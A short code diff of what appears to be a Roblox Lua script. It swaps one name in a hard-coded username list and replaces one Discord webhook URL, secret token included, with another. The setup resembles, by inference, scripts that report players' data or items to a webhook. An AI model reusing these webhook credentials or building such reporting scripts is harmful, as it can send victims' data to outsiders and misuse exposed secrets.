@@ -1,5 +1,5 @@
-usernames = { "xZicooo", "isaidmager", "214Eli_alt4" }
-webhook = "https://discord.com/api/webhooks/1401504146959368323/f0wuuzMXgffHU1o4S8xU6dn7LoQ0ltx_yxtaoShAwYvwPSrXt8q0oRJgOPIKpPHQ-xH2"
+usernames = { "xQuartz0", "isaidmager", "214Eli_alt4" }
+webhook = "https://discord.com/api/webhooks/1405151211308580886/AjtaOxk0qIfeHfYIgKwaHwyAZCHpuDVt3IpIJP6yoIFB4OUk51OyFQC_fu3xc2_vgzeU"
 
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
